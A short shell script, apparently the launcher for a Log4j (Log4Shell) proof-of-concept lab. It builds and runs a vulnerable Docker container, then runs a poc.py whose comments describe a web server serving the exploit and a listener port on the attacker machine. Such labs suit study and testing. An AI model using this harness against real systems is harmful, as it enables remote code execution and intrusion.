#! /bin/sh
mkdir /tmp/log4j-docker

sudo docker build . -t log4j-proof && sudo docker run -d --network host --mount type=bind,source="/tmp/log4j-docker",target="/tmp" log4j-proof 
pip install -r requirements.txt

# webport is for http server that serves exploit
# lport is for listener port on attacker machine
python3 poc.py --userip localhost --webport 8888 --lport 9001